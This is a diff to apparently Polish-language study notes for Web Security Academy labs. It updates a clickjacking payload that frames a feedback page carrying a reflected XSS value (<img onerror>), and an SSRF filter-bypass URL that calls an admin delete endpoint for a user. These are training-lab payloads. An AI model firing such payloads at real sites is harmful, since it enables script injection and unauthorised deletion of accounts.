@@ -49,21 +49,21 @@ Exploit server:
 <style>
 	iframe {
 		position:relative;
-		width: 700;
-		height: 500;
-		opacity: 0.1;
+		width: 1000;
+		height: 1000;
+		opacity: 0.7;
 		z-index: 2;
 	}
 	div {
 		position:absolute;
-		top: 610;
+		top: 820;
 		left: 80;
 		z-index: 1;
 	}
 </style>
-<div>Test me</div>
+<div>Click me</div>
 <iframe
-src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
 ```
 
 ## DOM-based vulnerabilities
@@ -93,7 +93,7 @@ Exploit server:
 ### SSRF with blacklist-based input filter
 1. Podmieniamy stockApi na:
 ```
-http://127.1/%2561dmin
+http://127.1/%2561dmin/delete?username=carlos
 ```
  
 ## HTTP request smuggling
